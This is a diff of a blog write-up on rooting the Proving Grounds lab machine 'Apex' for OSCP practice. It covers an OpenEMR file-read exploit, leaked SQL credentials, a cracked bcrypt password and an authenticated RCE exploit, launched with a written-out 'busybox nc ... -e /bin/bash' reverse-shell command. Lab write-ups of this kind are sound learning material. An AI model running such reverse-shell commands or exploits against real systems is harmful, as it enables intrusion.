@@ -10,15 +10,15 @@ tags: [Linux, LainKusunagi]
 
 Here's another writeup for Apex, an Intermediate Proving Grounds box I saw on the [LainKusunagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). I take note that the community has rated this Very Hard. As usual, I get started with an nmap scan (trying nmap Automator this time) and a quick search of the IP address in the URL bar in case there is a web server on port 80. It looks like there is:
 
-![Apex_1.png](/assets/images/Apex/Apex_1.png){: .center-aligned width="600px"}
+![Apex_1.png](/assets/images/Apex/Apex_1.png){: .responsive-image}
 
 Might as well run a directory scan on that as well while I look around. I see a few emails which could be usernames:
 
-![Apex_2.png](/assets/images/Apex/Apex_2.png){: .center-aligned width="600px"}
+![Apex_2.png](/assets/images/Apex/Apex_2.png){: .responsive-image}
 
 I also see `contact@apex.offsec`. I try a contact form, but it returns the error: "The form action property is not set!" I'm not expecting an SQLi point there. It seems most of the website is all on this one page, but after checking the top bar, I see that Scheduler is not shown on the main page, so I click that, and it takes me to a login page: 
 
-![Apex_3.png](/assets/images/Apex/Apex_3.png){: .center-aligned width="600px"}
+![Apex_3.png](/assets/images/Apex/Apex_3.png){: .responsive-image}
 
 Interesting. I wonder if that URL will show up on the directory scan. Time to check for default creds and exploits. I try a few options for default creds, but I can't get them working. At this point I get the nmap scan back and see: 
 
@@ -43,21 +43,21 @@ At this point I tried a bunch of different things, in particular trying to find 
 
 Eventually I used the first two walkthroughs and edited the exploit to point `path=` on line 36 to `path=/Documents`. This allowed me to read the sqlconf.php file...psych no it didn't. 
 
-![Apex_4.png](/assets/images/Apex/Apex_4.png){: .center-aligned width="600px"}
+![Apex_4.png](/assets/images/Apex/Apex_4.png){: .responsive-image}
 
 Even though the file is shown as having a non-zero size, it opens as blank, and it downloads as 0 bytes. But I can get it from the smbserver. 
 
-![Apex_5.png](/assets/images/Apex/Apex_5.png){: .center-aligned width="600px"}
+![Apex_5.png](/assets/images/Apex/Apex_5.png){: .responsive-image}
 
 That openemr:C78maEQUIeQ turn out to be the SQL creds, and from there we can look around. We see databases "information_schema" and "openemr" and use "openemr." There are a lot of tables, but we can zero in on "users" and ultimately "users_secure." We `SELECT * FROM users_secure` and get this:
 
-![Apex_6.png](/assets/images/Apex/Apex_6.png){: .center-aligned width="600px"}
+![Apex_6.png](/assets/images/Apex/Apex_6.png){: .responsive-image}
 
 I use namethathash to determine that this is bcrypt or hashcat mode 3200. And we get a password of "thedoctor." That gives us creds of admin:thedoctor which we can use on one of the many authenticated exploits for the openemr service found earlier on. I go with [this one](https://www.exploit-db.com/exploits/45161). The command looks like this: 
 `python2 45161.py http://192.168.216.145/openemr -u admin -p thedoctor -c 'busybox nc 192.168.45.235 80 -e /bin/bash'`
 
 I get a shell for `www-data`. And I try the usual low hanging fruit like checking for SUID binaries and `sudo -l`. I run linpeas and lse.sh, but eventually retry `thedoctor` as the root password. 
 
-![Apex_7.png](/assets/images/Apex/Apex_7.png){: .center-aligned width="600px"}
+![Apex_7.png](/assets/images/Apex/Apex_7.png){: .responsive-image}
 
 And we're done. Lessons learned - this was a tough one to feel good about as far as lessons learned are concerned. I was able to enumerate and find the correct exploit, but I couldn't ultimately get it working the way it was supposed to. I'm not sure how long that would have taken without looking up a writeup. Changing the path to a different internal directory for an attack using the clipboard would not have occurred to me very quickly, and I guess I can take solace in knowing that I was probably better off looking up that step after a few hours rather than spending a ton more time finding nothing. I also needed to use python2 at one point, not python or python3. I usually do try that, but after having spent a few hours I was pretty tired by the end and double checked my syntax using the writeup. All in all, I don't feel great about this one, but I guess that's why we put the time in. 
